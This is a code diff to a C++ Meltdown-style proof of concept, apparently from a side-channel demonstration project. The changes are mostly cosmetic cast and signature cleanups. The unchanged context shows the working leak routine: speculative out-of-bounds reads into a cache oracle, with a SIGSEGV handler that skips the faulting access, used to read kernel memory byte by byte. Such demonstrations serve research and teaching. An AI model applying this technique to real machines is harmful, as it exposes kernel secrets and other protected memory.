@@ -23,6 +23,8 @@
 #include <tuple>
 #include <vector>
 
+// TODO(asteinha) Windows, MacOS and vulnerable ARM support.
+
 #ifndef __linux__
 #  error Unsupported OS. Linux required.
 #endif
@@ -68,11 +70,11 @@ static char leak_byte(const char *data, size_t offset) {
     // value of the in-bounds access is usually different from the secret value
     // we want to leak via out-of-bounds speculative access.
     size_t safe_offset = run % strlen(public_data);
-    ForceRead(&isolated_oracle[(size_t)(data[safe_offset])]);
+    ForceRead(&isolated_oracle[static_cast<size_t>(data[safe_offset])]);
 
     // Access attempt to the kernel memory. This does not succeed
     // architecturally and kernel sends SIGSEGV instead.
-    ForceRead(&isolated_oracle[(size_t)(data[offset])]);
+    ForceRead(&isolated_oracle[static_cast<size_t>(data[offset])]);
 
     // SIGSEGV signal handler moves the instruction pointer to the following
     // label.
@@ -91,14 +93,17 @@ static char leak_byte(const char *data, size_t offset) {
   }
 }
 
-static void sigsegv(int sig, siginfo_t *siginfo, void *context) {
+static void sigsegv(
+    int /* signum */, siginfo_t * /* siginfo */, void *context) {
   // SIGSEGV signal handler.
   // Moves the instruction pointer to the "afterspeculation" label.
   ucontext_t *ucontext = (ucontext_t *)context;
 #ifdef __x86_64__
-  ucontext->uc_mcontext.gregs[REG_RIP] = (greg_t) afterspeculation;
+  ucontext->uc_mcontext.gregs[REG_RIP] =
+      reinterpret_cast<greg_t>(afterspeculation);
 #else
-  ucontext->uc_mcontext.gregs[REG_EIP] = (greg_t) afterspeculation;
+  ucontext->uc_mcontext.gregs[REG_EIP] =
+      reinterpret_cast<greg_t>(afterspeculation);
 #endif
 }
 
@@ -109,7 +114,7 @@ static void set_signal() {
   sigaction(SIGSEGV, &act, NULL);
 }
 
-int main(int argc, char **argv) {
+int main() {
   size_t private_data, private_length;
   std::ifstream in("/sys/kernel/kernel_data/address");
   if (in.fail()) {
@@ -126,7 +131,8 @@ int main(int argc, char **argv) {
   set_signal();
   std::cout << "Leaking the string: ";
   std::cout.flush();
-  const size_t private_offset = (const char *) private_data - public_data;
+  const size_t private_offset =
+      reinterpret_cast<const char *>(private_data) - public_data;
   for (size_t i = 0; i < private_length; ++i) {
     std::cout << leak_byte(public_data, private_offset + i);
     std::cout.flush();
